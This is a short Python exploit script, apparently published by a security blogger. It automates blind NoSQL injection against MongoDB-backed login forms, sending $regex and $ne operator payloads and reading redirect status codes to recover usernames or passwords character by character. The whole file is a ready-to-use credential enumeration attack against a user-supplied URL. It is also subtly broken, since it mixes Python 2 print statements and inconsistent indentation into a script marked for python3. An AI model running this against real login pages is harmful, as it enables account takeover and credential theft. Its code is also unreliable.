# Exploit Title: Blind Nosql injection leads to username/password enumeration in MongoDB using $(regex) and $(ne)
# Author: Rahul Kumar
# Blog: https://ircashem.github.io

#!usr/bin/python3

## yep this is tight
##
##

import requests
import sys
import string
import argparse
from colorama import Fore

user_para ="username" #u can change username parameter name according to ur need
passwd_para="password" #u can change password parameter name according to ur need

def method(url, payload):
        return requests.post(url, data=payload, allow_redirects=False)
        #return requests.get(url, params=payload, allow_redirects=False) Uncomment this to use login form as get request

parser = argparse.ArgumentParser()
parser.add_argument("-u", action="store",metavar="URL", help= "URL of login page of website. For instance: http://example.htb/login.php")
parser.add_argument("-e", action="store",metavar="Parameter 2 enumerate", help= "Eg: username/password")
args = parser.parse_args()

try:
	if len(sys.argv) == 1:
		print(parser.print_help(sys.stderr))
		print(Fore.YELLOW + "\nUsage: python " + sys.argv[0] + " -u http://example.com/index.php -e username")
		exit(0)
	url = args.u
	if args.e:
	        if args.e == user_para:
	                para1= user_para
	                para2= passwd_para
	        elif args.e == passwd_para:
	                para1= passwd_para
	                para2= user_para
	        else:
	                print(Fore.RED + "[-]Error: Please enter the valid parameter that need to enumerate. Eg: username/password")
	                exit(0)
	else:
		print(Fore.RED + "[-]Error: Please enter the Parameter that need to enumerate with -e.")
		exit(0)
	for c in string.printable:
	    if c not in ['*','+','.','?','|', '$', '^', '&', '\\']:
	            payload = {para1 + '[$regex]': "^" + c + ".*", para2 + '[$ne]': '1'}
	            response= method(url, payload)
	            if response.status_code != 302:
	                    item = Fore.YELLOW + "[+]Trying char: " + c
			    print "\033[K", item, "\r",
			    sys.stdout.flush()
	                    continue
	            print(Fore.CYAN + "[+]Found " + para1 + " that starts with char '" + c + "'")
	            check= True
	            user_or_passwd = c
	            while check:
	                check = False
	                for char in string.printable:
	                        if char not in ['*', '+', '.', '?', '|', '$', '^', '&', '\\']:
	                                temp = user_or_passwd + char
					item= Fore.YELLOW + "\b[+]Trying char: " + char
					print "\033[K", item, "\r",
					sys.stdout.flush()
	                                payload = {para1 + '[$regex]': "^" + temp + ".*", para2 + '[$ne]': '1'}
	                                response= method(url,payload)
	                                if response.status_code == 302:
	                                        print(Fore.MAGENTA + "Found one more char : '" + temp + "'")
						user_or_passwd = temp
	                                        check= True
						break
	            print(Fore.GREEN + "[+] " + para1 + " found: " + user_or_passwd)
	exit(0)	    
except AttributeError:
	print(parser.print_help(sys.stderr))
	exit(0)

#####
##
##
